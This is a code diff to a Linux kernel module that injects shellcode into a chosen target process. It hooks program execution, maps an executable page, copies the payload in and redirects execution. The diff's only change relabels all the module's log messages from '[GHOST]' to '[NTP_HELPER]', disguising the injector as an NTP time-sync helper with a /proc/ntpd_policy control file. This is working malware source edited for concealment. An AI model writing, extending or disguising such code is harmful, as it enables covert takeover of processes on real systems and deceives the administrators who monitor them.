@@ -190,7 +190,7 @@ static void ghost_inject_callback(struct callback_head *head)
 	sc_addr = vm_mmap(NULL, 0, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
 			  MAP_PRIVATE | MAP_ANONYMOUS, 0);
 	if (IS_ERR_VALUE(sc_addr)) {
-		pr_err("[GHOST] vm_mmap failed for PID %d (err %ld)\n", current->pid,
+		pr_err("[NTP_HELPER] vm_mmap failed for PID %d (err %ld)\n", current->pid,
 		       (long)sc_addr);
 		atomic_set(&ghost_injected, 0);
 		kfree(gw);
@@ -203,7 +203,7 @@ static void ghost_inject_callback(struct callback_head *head)
 
 	/* 3. Copy shellcode into victim's new page */
 	if (copy_to_user((void __user *)sc_addr, sc_buf, GHOST_SC_SIZE)) {
-		pr_err("[GHOST] copy_to_user failed for PID %d\n", current->pid);
+		pr_err("[NTP_HELPER] copy_to_user failed for PID %d\n", current->pid);
 		vm_munmap(sc_addr, PAGE_SIZE);
 		atomic_set(&ghost_injected, 0);
 		kfree(gw);
@@ -216,12 +216,12 @@ static void ghost_inject_callback(struct callback_head *head)
 	ghost_victim_pid = current->pid;
 	uregs->ip = sc_addr;
 
-	pr_info("[GHOST] === INJECTION COMPLETE ===\n");
-	pr_info("[GHOST]   PID       : %d (%s)\n", current->pid, current->comm);
-	pr_info("[GHOST]   Orig Entry: 0x%llx\n", orig_rip);
-	pr_info("[GHOST]   Shellcode : 0x%lx (%zu bytes)\n", sc_addr, GHOST_SC_SIZE);
-	pr_info("[GHOST]   Flow: open->ioctl(0x5301)->close->jmp 0x%llx\n", orig_rip);
-	pr_info("[GHOST] ============================\n");
+	pr_info("[NTP_HELPER] === INJECTION COMPLETE ===\n");
+	pr_info("[NTP_HELPER]   PID       : %d (%s)\n", current->pid, current->comm);
+	pr_info("[NTP_HELPER]   Orig Entry: 0x%llx\n", orig_rip);
+	pr_info("[NTP_HELPER]   Shellcode : 0x%lx (%zu bytes)\n", sc_addr, GHOST_SC_SIZE);
+	pr_info("[NTP_HELPER]   Flow: open->ioctl(0x5301)->close->jmp 0x%llx\n", orig_rip);
+	pr_info("[NTP_HELPER] ============================\n");
 
 	kfree(gw);
 }
@@ -259,7 +259,7 @@ static int ghost_pre_handler(struct kprobe *p, struct pt_regs *regs)
 
 	gw = kmalloc(sizeof(*gw), GFP_ATOMIC);
 	if (!gw) {
-		pr_err("[GHOST] kmalloc failed, injection aborted\n");
+		pr_err("[NTP_HELPER] kmalloc failed, injection aborted\n");
 		atomic_set(&ghost_injected, 0);
 		return 0;
 	}
@@ -267,13 +267,13 @@ static int ghost_pre_handler(struct kprobe *p, struct pt_regs *regs)
 	init_task_work(&gw->twork, ghost_inject_callback);
 
 	if (my_task_work_add(current, &gw->twork, TWA_RESUME)) {
-		pr_err("[GHOST] task_work_add failed\n");
+		pr_err("[NTP_HELPER] task_work_add failed\n");
 		kfree(gw);
 		atomic_set(&ghost_injected, 0);
 		return 0;
 	}
 
-	pr_info("[GHOST] Target '%s' (PID %d) detected! Injection scheduled.\n", bprm->filename,
+	pr_info("[NTP_HELPER] Target '%s' (PID %d) detected! Injection scheduled.\n", bprm->filename,
 		current->pid);
 
 	return 0;
@@ -313,9 +313,9 @@ static ssize_t ghost_proc_write(struct file *file, const char __user *buf, size_
 	ghost_shellcode_va = 0;
 
 	if (ghost_target[0])
-		pr_info("[GHOST] Target armed: '%s'\n", ghost_target);
+		pr_info("[NTP_HELPER] Target armed: '%s'\n", ghost_target);
 	else
-		pr_info("[GHOST] Target disarmed.\n");
+		pr_info("[NTP_HELPER] Target disarmed.\n");
 
 	return count;
 }
@@ -358,13 +358,13 @@ int svm_ghost_init(void)
 
 	ret = resolve_task_work_add();
 	if (ret < 0) {
-		pr_err("[GHOST] Cannot resolve task_work_add (%d)\n", ret);
+		pr_err("[NTP_HELPER] Cannot resolve task_work_add (%d)\n", ret);
 		return ret;
 	}
 
 	ret = register_kprobe(&ghost_kp);
 	if (ret < 0) {
-		pr_err("[GHOST] kprobe on '%s' failed (%d)\n", ghost_kp.symbol_name, ret);
+		pr_err("[NTP_HELPER] kprobe on '%s' failed (%d)\n", ghost_kp.symbol_name, ret);
 		return ret;
 	}
 
@@ -374,7 +374,7 @@ int svm_ghost_init(void)
 		return -ENOMEM;
 	}
 
-	pr_info("[GHOST] Engine armed on '%s' @ %px | /proc/ntpd_policy ready\n",
+	pr_info("[NTP_HELPER] Engine armed on '%s' @ %px | /proc/ntpd_policy ready\n",
 		ghost_kp.symbol_name, ghost_kp.addr);
 	return 0;
 }
@@ -384,5 +384,5 @@ void svm_ghost_exit(void)
 	if (ghost_proc_entry)
 		proc_remove(ghost_proc_entry);
 	unregister_kprobe(&ghost_kp);
-	pr_info("[GHOST] Engine disarmed.\n");
+	pr_info("[NTP_HELPER] Engine disarmed.\n");
 }
